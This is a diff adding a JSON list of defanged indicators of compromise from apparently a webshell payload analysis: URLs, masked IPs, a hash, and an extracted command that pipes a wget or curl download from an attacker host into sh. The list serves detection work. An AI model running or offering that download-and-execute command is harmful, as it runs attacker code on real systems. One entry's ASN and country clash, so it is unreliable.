@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh)"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "217[.]60[.]195.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]164.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget --no-check-certificate -qO- hxxps://217[.]60[.]195[.]XXX/sh || curl -sk hxxps://217[.]60[.]195[.]XXX/sh) | sh -s apache.selfre"
+  },
+  {
+    "context": "Inbound payload hash (webshell)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f"
+  },
+  {
+    "asn": "Uzbektelekom Joint Stock Company",
+    "country": "Argentina",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "89[.]126[.]211.XXX"
+  }
+]
